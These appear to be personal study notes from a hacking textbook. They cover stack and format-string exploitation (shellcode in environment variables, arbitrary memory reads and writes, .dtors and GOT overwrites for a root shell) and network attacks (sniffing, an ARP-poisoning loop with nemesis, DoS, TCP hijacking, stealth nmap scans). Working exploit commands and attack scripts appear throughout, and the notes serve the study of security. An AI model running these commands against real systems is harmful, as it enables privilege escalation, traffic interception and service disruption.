# Controlling Program Flow
## Environment Variables
We can use the environment variables to store shellcode that is too big to fit inside a buffer.
```sh
export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat shellcode.bin)
```
This would place the shellcode on the stack in an environment variable, along with a 200-byte NOP sled.

We can then find an address somewhere in that range of the sled to overwrite the saved return address with.

The environment variables are located near the bottom of the stack, so that is where we should look in a debugger.
Use `esp` when on breakpoint main to find the bottom of the stack.

### Using `getenv()` 
`getenv()`, accepts the name of an environment variable as its only argument and returns the variable's memory address.
This provides a much more accurate prediction of where the same environment variable will be when the target program is run. (Still requires NOP sled, as it is NOT FULLY accurate)

The length of the name of the program being executed also has an affect on the address of the environment variables.

To know the exact difference in length between the names, we can test different names using the same program that runs `getenv()` and change the name from length 1, up to 4. Hence we can do something like this

```c
int main(int argc, char *argv[]) {
	char *ptr;

	const int diff = 2; // difference in length between names, experiment to find

	if (argc < 3) {
		printf("Usage: %s <environment var> <target program name>\n", argv[0]);
		exit(0);	
	}
	ptr = getenv(argv[1]); // Get env var location
	ptr += (strlen(argv[0]) - strlen(argv[2]))*diff; // Adjust for program name
	printf("%s will be at %p\n", argv[1], ptr);
}
```

Environment variables simplify things considerably, and can be used to make exploit code more reliable.



## Heap based overflows
When heap memory is freed by the `free()` command after being overflowed, errors in the heap headers are detected and the program is terminated. 
Similar to return address overwrite with stack overflows, there are control points within the heap architecture itself. 
Heap unlinking counters in glibc make heap unlinking in linux very difficult.
Depending on the exploit, we may not need heap header information to do magic, so by the time `free()` is called, it would be too late.

## `/etc/passwd`
The file has the following format delimited by colons, from left to right
1. login name
2. password
3. user id
4. group id
5. username
6. home directory
7. login shell
the password fields are all filled with the `x` character, since the encrypted passwords are stored elsewhere in a shadow file. (However, this field can contain the encrypted password)
Any entry in the password file that has a user ID of 0 will be given root privileges

The goal to editing this file would be to append an extra entry with both root privileges and a known password to the password file.

### Encryption 
Salt value is always at the beginning of the hash. 

When a user logs in and enters a password, 
1. the system looks up the encrypted password for that user.
2. Finds the salt value from the stored encrypted password
3. The system uses the same one-way hashing algorithm to encrypt whatever text the user typed as the password
4. The system then compares to 2 hashes

This allows the password to be used for authentication without requiring that the password be stored anywhere in the system

## `printf()`
when the `printf()` argument is called, the arguments are pushed to the stack in reverse order. 
```c
printf("A is %d and is at %08x. B is at %x.\n", A, &A, B);
```
First the value of B, then the address of A, then the value of A, and finally the address of the format string.

The format function:
1. iterates through the format string one character at a time
2. If not the beginning of a format parameter, i.e, `%`
	1. character is copied to the output
3. if format character, argument in the stack is used, if argument is not there, whatever is there is used (the address is just incremented)

When coding, never use `printf(string)`, always do `printf("%s", string)`

By exploiting this, we can examine the lower stack memory by simply putting format parameters in the string
```sh
./fmt_vuln $(perl -e 'print "%08x."x40')
```
Remember that each four-byte word is backward, due to the little-endian architecture.

### reading from arbitrary memory address
the `%s` parameter can be used to read from arbitrary memory addresses. 

Since the format string is the last thing to be in argument stack, if we simply provide more format parameters than required, we would start to reference the format string itself.
In doing so, as long as we put the memory address we want to read in front of the string, we can use `%s` to read that address.

```sh
./fmt_vuln $(printf "\xef\xbe\xad\xde")%08x.%08x.%08x.%s
```
or however many `%08x.` we need to get to the start of the string. these can be omitted once we know the distance between the end of the stack frame and the beginning of the format string memory

### writing to arbitrary memory address
We can use the same technique and `%n` to write to an arbitrary memory address.
By manipulating the field-width option of onoe of the format parameters beforet the `%n`, a certain number of blank spaces can be inserted.
Controlling the number of bytes written before the `%n` parameter. This works for small numbers, but not larger ones. like memory addresses.
```sh
./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%180x%n <--format parameter
^vulnprog^ ^--target memory address--^^--controlling the bytes written with blank space
```

#### Using sequential writes
| Memory                     | 94 | 95 | 96 | 97 |
| First write to 0x08049794  | AA | 00 | 00 | 00 |
| Second write to 0x08049794 |    | BB | 00 | 00 |
| Third write to 0x08049794  |    |    | CC | 00 |
| Fourth write to 0x08049794 |    |    |    | DD |
| Result                     | AA | BB | CC | DD |

Write from LSB to MSB
First write: 0x000000aa
Second write: 0x000000bb
Third write: 0x000000cc
Fourth write: 0x000000dd

```sh
./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%08x%n
```

Three `%x`s cuz there are 3 arguments to the `printf` call

The last %x format parameter uses 8 as the field width to standardize the output.
- Essentially reads a random DWORD from the stack
- outputs anywhere from 1 to 8 characters

If 28 is the first overwrite, then you have to take
```
<target_value> - 28 + 8
```

In order to use another `%x` format parameter to increment the byte count for the next sequential write (in partcular, the number that `%n` will eventually write), we need to introduce some `JUNK` that will use up the `%x` format parameter

The beginning of the format string should look like this
| 0x08049794  |             | 0x08049795  |        | 0x08049796  |        | 0x08049796  |
| 94.97.04.08 | JUNK        | 95.97.04.08 | JUNK   | 96.97.04.08 | JUNK   | 97.97.04.08 |
| %n (write)  | %x (+bytes) | %n (write)  | %x(+b) | %n (write)  | %x(+b) | %n (write)  |

So if we were to write `0xddccbbaa` into `0x08049794`:
```sh
./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n%17x%n%17x%n%17x%n
```
It is impossible to subtract bytes from the byte counter, so
what if a previous write has a bigger number than a sequential write after?
- Add until the number wraps around (cuz binary)
- Overflow will be overwritten by the sequential write after that

Let's try to write `0x0806abcd` into `0x080497f4`:
```sh
./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf4\x97\x04\x08JUNK\xf4\x97\x04\x08JUNK\xf4\x97\x04\x08")%x%x%161x%n%222x%n%91x%n%258x%n
```
1. `%161x` is found by taking `0xcd - bytes_already_written + 8 // field width`
2. `%222x` is found by taking `0x1ab - 0xcd`
3. `%91x` is found by taking `0x106 - 0xab`
4. `%258` is found by taking `0x108 - 0x06`

`%x` has a minimum field width of 08, so writing in a field width smaller than that would still output 8. Hence we cannot use `0x08 - 0x06`

By controlling the LSB and performing four writes, an entire address can be written to any memory address.

### Direct Parameter Access
Direct parameter access is a way to simplify format string exploits.
This method of direct access eliminates the need to step through memeroy until the beginning of the format string is located, since this memory can be accessed directly.

```sh
./fmt_vuln AAAA%4\$x
```

Since memory can be accessed directly, there's no need for four-byte spaces of junk data to increment the byte output count.
We can just directly access a piece of memory found before the format string.

Let's take a look trying to put `0xbffffd72` into the variable@`0x08049794`
```sh
./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08" . "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%98x%4\$n%139x%5\$n%258x%6\$n%192x%7\$n
```
1. `%98x` is found by taking `0x72 - 16 (count the bytes u put in the string)`
2. `%139x` is found by taking `0xfd - 0x72`
3. `%258x` is found by taking `0x1ff - 0xfd (0xff - 0xfd < 8 so take 0x1ff)`
4. `%192x` is found by taking `0x1bf - 0xff (0xbf - 0xff < 0 so take 0x1bf)`
	
### Short writes
A short is typically a two byte word. And can be used with format string exploits to write two-byte shorts.

```sh
./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%x%hn
```

Using this, an entire four bytes can be overwritten with just two `%hn` parameters. Let's try the above example again.
```sh
./fmt_vuln $(printf "\x94\x97\x04\x08\x96\x97\x04\x08")%64874x%4\$hn%49805x%5\$hn
```
1. `%64874x` is found by `0xfd72 - 8`
2. `%49805x` is found by `0x1bfff - 0xfd72`

Using short writes however, the order of writes don't matter, since we always write four bytes
```sh
./fmt_vuln $(printf "\x96\x97\x04\x08\x94\x97\x04\x08")%49143x%4\$hn%15731x%5\$hn
```
1. `%49143x` is found by `0xbfff - 8`
1. `%15731x` is found by `0xfd72 - 0xbfff`


### .dtors 
Use `nm` to find the address of the target function
```sh
nm <target_program>
```
From here you can also find:
- The start of the `.dtors section`, `__DTOR_LIST__`
- The end of the `.dtors section`, `__DTOR_END__`
This means that whatever address `__DTOR_LIST__` is at, it should contain `0xffffffff`
And it also means that whatever address `__DTOR_END__` is at, it should contain `0x00000000`

Because this `.dtors` section is writeable, if the address after the `0xffffffff` is overwritten with a memory address, we can take over the execution flow of the program.
This will be the address of the `__DTOR_LIST__` + 4.

If this program is SUID root, it will be possible to obtain a root shell.

1. Put shellcode into an environment variable.
2. Predict its address as usual
3. Write the address of the SHELLCODE into the `.dtors` section using the format string vulnerability
4. When the program exits, the shellcode will be called, spawning a root shell.

### Overwriting the Global Offset Table
One of the jump instructions inside the global offset table is the `exit()` function.

If this jump instruction used for the `exit()` function can be manipulated to direct the execution flow into shellcode instead, a root shell will be spawned.

The procedure linking table is shown to be read-only, but that doesn't matter because they are jumping to pointers to addresses (functions).

These addresses exist in another section, called the global offset table (GOT), and is writeable.

If the address of the shellcode is overwritten at this location, the program should call the shellcode when it thinks it's calling the `exit()` function.

A big advantage of overwriting the GOT is that the GOT entries are fixed per binary, so a different system with the same binary will have the same GOT entry at the same address.
# Networking
## Network Sniffing
On a unswitched network, Ethernet packets pass through every device on the network, expecting each system device to only look at the packets sent to its destination address.

We can however, set the device to promiscuous mode, which causes it to look at all packets.
```sh
sudo ifconfig eth0 promisc
```
And then sniff with 
```sh
sudo tcpdump -l -X 'ip host 192.168.0.118'
```
Data transmitted over the network by services such as
- telnet
- ftp
- pop3
are unencrypted. And since they are unencrypted, usernames and passwords are simply contained in the data portions of the transmitted packets.

There are also specialized sniffing tools designed specifically to search for usernames and passwords, such as `dsniff`
```sh
sudo dsniff -n
```

We can also create our own TCP sniffing program using raw sockets, by declaring the socket as following:
```c
sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)
```
We can then print the raw data of the packet using `dump()`, after receiving it with `recv(sockfd, buffer, 8000, 0)`
```c
dump(buffer, recv_length)
```
Usage of raw sockets requires root access, hence sniffing program needs to be run as root.

Using `libpcap` we can create a sniffing program (using raw sockets) that is compatible with most architectures.

## Active Sniffing
In a switched network environment, packets are only sent to the port they are destined for.
However, there are clever ways to sniff other devices' packets; it just requires some knowhow.

Spoofing is the first step in sniffing packets on a switched network.

### Spoofing
Spoofing is the act of forging a source address in a packet.

We can exploit a switch with these 3 pieces of information:
1. There's no provision in these protocols to ensure that the source address in a packet really is the address of the source machine.
2. When an ARP reply comes in with an IP address that already exists in the ARP cache, the receiving system will overwrite the prior MAC address infnormation with the new information found in the reply (unless entry is explicitly marked permanent)
3. No state information about the ARP traffic is kept, this means systems will accept an ARP reply even if they didn't send out an ARP request.
These details, when exploited properly, allow an attacker to sniff network traffic on a switched network using a technique known as ARP redirection:
The attacker sends spoofed ARP replies to certain devices that cause the ARP cache entries to be overwritten with the attacker's data (AKA cache poisoning)
 
To sniff network traffic between two points, A and B
1. Attacker needs to poison the ARP cache of A to cause A to believe that B's IP address is at attacker's MAC address
2. Attacker needs to poison the ARP cache of B to cause B to believe that A's IP address is at attacker's MAC address
3. Attacker's machine simply needs to forward htese packets to appropriate final destinations.

This works because:
- A and B are wrapping their own Ethernet headers on their packets based on their respective ARP caches
- A's IP traffic meant for B is actually sent to the attacker's MAC address, vice-versa
- Switch only filters traffic based on MAC address, sending A's and B's IP traffic, destined for the attacker's MAC address.
- Victims' machines are tricked into redirecting their traffic through the attacker's machine, switch works as designed.

Because of timeout values, machines will periodically send and receive real ARP requests.
To maintain the redirection attack, the attacker must keep the victim machines' ARP caches poisoned.
We could send spoofed ARP replies to both A and B at a constant interval (every 10 seconds)

#### Gateway
A gateway is a system that routes all the traffic from a local network out to the internet.
This traffic will be restricted by MAC address, so in order to sniff this traffic, it must be redirected.

1. First determine the MAC addresses of the gateway and target system, do so by pinging these hosts
```sh
ping -c 1 -w 1 192.168.0.1 # gateway
ping -c 1 -w 192.168.0.118 # target address
arp -na # check IP/MAC cache
ifconfig eth0 # check your own MAC address
```
2. These spoofed packets can be injected using a command-line packet injection tool called [nemesis](https://github.com/libnet/nemesis)
```sh
nemesis arp help
```
3. Use a bash shell while loop to send our two poisoned ARP replies every 10 seconds
```sh
while true
do
	sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D 192.168.0.118 -h 00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -M 00:C0:F0:79:3D:30
	sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D 192.168.0.1 -h 00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M 00:50:18:00:0F:01
	echo "Redirecting..."
	sleep 10
done
```

#### libnet
Nemesis uses `libnet`, which provides a simple and uniform API to craft and inject network packets.
The source file `nemesis-arp.c` contains several functions for crafting and injecting ARP packets, using statically defined data structures.
```c
// From nemesis-arp.c
void nemesis_arp(int argc, char **argv)
{
	const char *module = "ARP/RARP Packet Injection";
	libnet_t *l;

	nemesis_maketitle(title, module, version);

	if (argc > 1 && !strncmp(argv[1], "help", 4))
		arp_usage(argv[0]);

	arp_initdata(); // inits datastructures, nemesis-arp.c
	arp_cmdline(argc, argv); // process-command-line, nemesis-arp.c

	// create by Jacyu, create the libnet handler
	l = libnet_init(LIBNET_LINK_ADV, device, errbuf);
	if (l == NULL) {
		fprintf(stderr, "ERROR: Device not specified and unable to automatically select a device.\n");
		arp_exit(1);
	}

	arp_validatedata(); // validates data, nemesis-arp.c

	/* Determine if there's a source hardware address set */
	if ((nemesis_check_link(&etherhdr, l)) < 0) {
		fprintf(stderr, "ERROR: Cannot retrieve hardware address of %s.\n", device);
		arp_exit(1);
	}

	arp_verbose(); // verbose reporting

	if (got_payload) {
		if (builddatafromfile(ARPBUFFSIZE, &pd, file, PAYLOADMODE) < 0)
			arp_exit(1);
	}

	if (buildarp(&etherhdr, &arphdr, &pd, l) < 0) {
		printf("\n%s Injection Failure\n", (rarp == 0 ? "ARP" : "RARP"));
		arp_exit(1);
	}

	arp_exit(0);
}
```
The structures `ETHERhdr` and `ARPhdr` are defined in the file `nemesis.h` as aliases to existing `libnet` datastructures
```c
// from nemesis.h
typedef struct libnet_as_lsa_hdr     ASLSAhdr;
typedef struct libnet_auth_hdr       AUTHhdr;
typedef struct libnet_dbd_hdr        DBDhdr;
typedef struct libnet_dnsv4_hdr      DNShdr;
typedef struct libnet_ethernet_hdr   ETHERhdr;
typedef struct libnet_icmpv4_hdr     ICMPhdr;
typedef struct libnet_igmp_hdr       IGMPhdr;
typedef struct libnet_ipv4_hdr       IPhdr;
typedef struct libnet_ipv6_hdr       IP6hdr;
typedef struct libnet_lsa_hdr        LSAhdr;
typedef struct libnet_lsr_hdr        LSRhdr;
typedef struct libnet_lsu_hdr        LSUhdr;
typedef struct libnet_ospf_hdr       OSPFhdr;
typedef struct libnet_ospf_hello_hdr OSPFHELLOhdr;
typedef struct libnet_net_lsa_hdr    NETLSAhdr;
typedef struct libnet_rip_hdr        RIPhdr;
typedef struct libnet_rtr_lsa_hdr    RTRLSAhdr;
```
The `nemesis_arp()` function calls the function `buildarp()` with pointers to the header data structures. `buildarp()` builds the packet and injects it.
```c
// From nemesis-proto_arp.c
int buildarp(ETHERhdr *eth, ARPhdr *arp, struct file *pd, libnet_t *l)
{
	uint32_t len;
	int      n = 0;

	/* validation tests */
	if (pd->file_buf == NULL)
		pd->file_len = 0;

	len = LIBNET_ARP_H + LIBNET_ETH_H + pd->file_len;

#ifdef DEBUG
	printf("DEBUG: ARP packet length %u.\n", len);
	printf("DEBUG: ARP payload size  %zd.\n", pd->file_len);
#endif

	// build arp header for packets
	libnet_build_arp(arp->ar_hrd,
	                 arp->ar_pro,
	                 arp->ar_hln,
	                 arp->ar_pln,
	                 arp->ar_op,
	                 arp->ar_sha,
	                 arp->ar_spa,
	                 arp->ar_tha,
	                 arp->ar_tpa,
	                 pd->file_buf,
	                 pd->file_len,
	                 l,
	                 0);

	libnet_build_ethernet(eth->ether_dhost, eth->ether_shost, eth->ether_type, NULL, 0, l, 0);

	n = nemesis_send_frame(l, &len);
	if (n != (int)len) {
		fprintf(stderr, "ERROR: Incomplete packet injection.  Only "
			"wrote %d bytes.\n", n);
	} else {
		if (verbose) {
			printf("Wrote %d byte %s packet through linktype %s.\n", n,
			       (eth->ether_type == ETHERTYPE_ARP ? "ARP" : "RARP"),
			       nemesis_lookup_linktype(l->link_type));
		}
	}

	libnet_destroy(l);

	return (n);
}
```

Another solution to the ARP redirection attack is provided by `arpspoof`, included with `dsniff`
This program uses the `arp_send()` function, which also uses `libnet` to spoof packets.

### Denial of Service
A DoS attack simply prevents access to a service or resource. There are two general forms of DoS attacks
1. Those that crash services
2. Those that flood services
DoS attacks that crash services are more similar to program exploits rather than network-based exploits.

#### SYN Flooding
A SYN flood tries to exhaust states in the TCP/IP stack. Since TCP maintains "reliable" connections, each connection needs to be tracked somewhere.
The TCP/IP stack in the kernel handles this, but it has a finite table that can only track so many incoming connections.
A SYN flood uses spoofing to take advantage of this limitation:
1. Attacker floods the victim's system with many SYN packets, using a spoofed nonexistent source address.
2. Victim machine will send a SYN/ACK packet to the spoofed address in response and wait for the expected ACK response.
3. These half-open connections goes into a backlog queue that has limited space.
4. Since spoofed source addresses don't actually exist, the ACK responses needed to remove these entries from the queue and complete the connections never come.
5. half-open connection must time out, which takes a relatively long time
6. The attacker continues to flood the victim's system with spoofed SYN packets, causing the victim's backlog queue will remain full
7. Real SYN packets cannot get to the system and initiate valid TCP/IP connections

Some operating systems (for example, Linux) use a technique called syncookies to try to prevent SYN flood attacks. 
1. The TCP stack using syncookies adjusts the initial acknowledgement number for the responding SYN/ACK packet using a value based on host details and time (to prevent replay attacks)
2. TCP connections don't actually become active until the final ACK packet for the TCP handshake is checked.
3. If the sequence number doesn't match or the ACK never arrives, a connection is never created
This prevents spoofed connection attempts, since the ACK packet requires information to be sent to the source address of the initial SYN packet.


#### Ping of Death
According to ICMP specification, ICMP echo messages can only have 65536 bytes of data in the data part of the packet
Since the important information is in the header, some OSes might crash if messages exceed the size.
This is known as "The Ping of Death".
Although modern operation systems have patched against this vulnerability, new technologies sometimes suffer from similar problems.
For example, on the bluetooth protocol, there is a similar ping packet on the L2CAP layer, which is used to measure communication time on established links.
Many implementations suffer from the same oversized ping packet problem, dubbed **Bluesmack**

#### Teardrop
Teardrop exploited another weakness in several vendors' implementations of IP fragmentation reassembly.
1. When a packet is fragmented, the offsets stored in the header will line up to reconstruct the original packet with no overlap
2. teardrop attack sends packet fragments with overlapping offsets, causing implementations that don't check for this irregularity to crash
Although this attack does not work anymore, often, the same mistakes made in the past are repeated by early implementations of new products.

#### Ping flooding
Flooding DoS attacks don't try to necessarily crash a service or resource, but instead try to overload it so it can't respond.
One way is to just ping flood, to use up the victim's bandwidth so that legitimate traffic can't get through.


#### Amplification attacks
Amplification attack uses spoofinf and broadcast addressing to amplify a single stream of packets by a hundred-fold.
1. Find a target amplification system (A network that allows communication to the broadcast address and has a relatively high number of active hosts)
2. Attacker send large ICMP echo request packets to the broadcast address of the amplification network, with a spoofed source address of the victim's system.
3. Amplifier broadcast these packets to all the hosts on the amplification network, which will send corresponding ICMP echo reply packets to the spoofed source address
Amplification of traffic allows the attacker to send a relatively small stream of ICMP echo request packets out, while the victim gets swamped with up to a couple hundred times as many ICMP echo reply packets.
These techniques are known as smurf and fraggle attacks.

#### Distributed DoS flooding
A DDoS attack is a distributed version of a flooding DoS attack. By increasing the bandwidth the attacker is able to work with, the attacker can do more damage.
1. Attacker first compromises a number of other hosts and installs daemons on them (bots or botnet)
2. Attacker picks a victim and using some sort of a controlling program, all the bots simultaneously attack the victim with some form of flooding DoS attack.
Tracing the attack source is also much more difficult

### TCP/IP Hijacking
TCP/IP hijacking is a technique that uses spoofed packets to take over a connection between a victim and a host machine.
This technique is exceptionally useful when the victim uses a one-time password to connect to the host machine.
1. Attacker must be on the same network as the victim
2. By sniffing the local network segment, all of the details of open TCP connections can be pulled from the headers.
3. Each TCP packet contains a sequence number in the header
4. Attacker has access to the sequence numbers for a connection between a victim and a host machine
5. Attacker sends a spoofed packet from the victim's IP address to the host machine, using the sniffed sequence number to provide the proper acknowledgment number
6. Host machine will receive the spoofed packet with the correct acknowledgment number and will have no reason to believe it didn't come from the victim machine.

#### RST Hijacking
A simple form of TCP/IP hijacking involves injecting an authentic-looking reset (RST) packet
If the source is spoofed and the acknowledgement number is correct, the receiving side will believe that the source actually sent the reset packet, and the connection will be reset.

Let's imagine a program that does this:
1. It does not need to look at every packet, only the established TCP connections to the target IP
2. `libpcap` provides a way to tell the kernel to only send certain packets that match a filter, called the Berkeley Packet Filter (BPF), is very similar to a program
For example, `tcpdump` also uses BPFs to filter what it captures
```sh
sudo tcpdump -d "dst host 192.168.42.88"
```
3. All established connections should have their ACK flag set, so this is what we should look for.
TCP flags are found in the 13th octet of the TCP header. This means that if the ACK flag is turned on, the 13th octet would be `00010000` in binary, (16 in decimal), if both SYN and ACK then it would be `00010010` (18 in decimal)
We can filter for ACK using this filter rule
```sh
# bitwise AND operator to filter
sudo tcpdump -nl "tcp[tcpflags] & tcp-ack != 0 and dst host 192.168.42.88"
```

##### Continued hijacking
When the spoofed packet contains data, it gets even more interesting:
1. The host machine receives the spoofed packet, increments the sequence nmuber, and responds to the victim's IP
2. Since the host machine's response has an incorrect sequence nmuber, the victim ignores the response packet.
3. The victim's sequence number count is off. 
4. Any packet the victim tries to send to the host machine will have an incorrect sequence number as well, causing the host machine to ignore it.
5. The attacker that started all this chaos can keep track of sequence numbers and continue spoofing packets from the victim's IP address to the host machine.
6. Attacker continues communicating with the host machine while the victim's connection hangs

### Port Scanning
A port scanning called nmap - written by Fyodor, implements the following port-scanning techniques.
#### Stealth SYN Scan
Also known as a half-open scan. A SYN scan doesn't complete the handshake, so a full connection is never opened.
Using nmap, a SYN scan can be performed using the command-line option
```sh
sudo nmap -sS 192.168.42.72
```
#### FIN, X-mas and Null scans
These all involve sedning a nonsensical packet to every port on the target system. If a port is listening, these packets just get ignored.
However, if the port is closed and the implementation follows protocol (RFC 793), an RST packet will be sent.
This difference can be used to detect which ports are accepting connections, without actually opening any connections
- FIN scan sends a FIN packet.
- X-mas scan sends a packet with FIN, URG, and PUSH turned on (named cause the flags are lit up like a christmas tree)
- Null scan sends a packet with no TCP flags set.
While these scans are stealthier, they can also be unreliable. (Microsoft's implementation of TCP doesn't send RST packets like it should, making this form of scanning ineffective)
FIN, X-mas, and NULL scans can be performed with `nmap` using the command-line options `-sF`, `-sX`, `-sN`, respectively. 
#### Spoofing Decoys
Another way to avoid detection is to hide amoung several decoys. This technique:
1. spoofs connections from various decoy addresses in between each real port-scanning connection.
2. Responses aren't needed, since they are simply misleads
3. spoofed decoy addresses must use real IP of live hosts; otherwise the target might be accidentally SYN flooded
Decoys can be specified in `nmap` with the `-D`command-line option. Here we scan the IP `192.168.42.72` using `192.2168.42.10` and `192.2168.42.11` as decoys
```sh
sudo nmap -D 192.168.42.10,192.168.42.11 192.168.42.72
```
#### Idle Scanning
Idle scanning is a way to scan a target using spoofed packets from an idle host, by observing changes in the idle host.
Attacker needs to find a usable idle host that is not sending or receiving any other network traffic and that has a TCP implementation that produces predictable IP IDs that change by a known increment with each packet.
IP IDs are supposed to be unique per packet per session, and are commonly incremented by a fixed amount
Newer operating systems randomize the IP ID, but older ones (such as printers) typically do not

1. Attacker gets the current IP ID of the idle host by contacting it with a SYN packet or an unsolicited SYN/ACK packet and observes the IP ID of the response.
2. By repeating this a few more times, the increment applied to the IP ID with each packet can be determined
3. Attaker then sends a spoofed SYN packet with the idle host's IP address to a port on the target machine. 
4. One of two things will happen, depending on whether that port on the victim machine is listening
   - if the port is listening, a SYN/ACK packet will be sent back to the idle host. But since the idle host didn't actually send out the initial SYN packet, this response appears to be unsolicited to the idle host, and it responds by sending back an RST packet
   - If that port isn't listening, the target machine doesn't send a SYN/ACK packet back to the idle host, so the idle host doesn't respond.
5. The attacker contacts the idle host again to determine how much the IP ID has incremented. 
   - If it has only incremented by one interval, no other packets were setn out by the idle host between the two checks. This implies that the port on the target machine is closed.
   - If the IP ID has incremented by two intervals, one packet, presumably an RST packet, was sent out by the idle machine between the checks. This implies that the port on the target machine is open
If the idle host isn't truly idle, the results will be skewed, as expected.
If this tehcnique is used properly on an idle host that doesn't have any logging capabilities, the attacker can scan any target without ever revealing his or her IP address.
```sh
sudo nmap -sI <idle_host> <target_machine>
```
#### Proactive Defense (shroud)
Port scans are often used to profile systems before they are attacked. 
Knowing what ports are opened allows an attacker to determine which services can be attacked.
How do we prevent port scans before they actually happen?

FIN, NULL, and X-mas scans can be prevented by a simple kernel modification. 
If the kernel never sends reset packets, these scans will turn up nothing.
This works fine for scans that rely on RST packets, but preventing info leakage with SYN scans and full-connect scans is a bit more difficult

In order to limit the usefulness of receiving a SYN/ACK packet. All closed ports could also respond with SYN/ACK packets, the amount of useful information an attacker could retrieve from port scans would be minimized.
Opening every port would cause a major performance hit.
Instead, 
1. use a more complex BPF string to filter only SYN packets destined for closed ports.
2. Then, the callback functions spoofs a legitimate looking SYN/ACK response to any SYN packet that makes it throught the BPF.
3. Port scanners are flooded with a sea of false positives.
A dedicated attacker could simply telnet to every port to check the banners, but this technique could easily be expanded to spoof banners also.


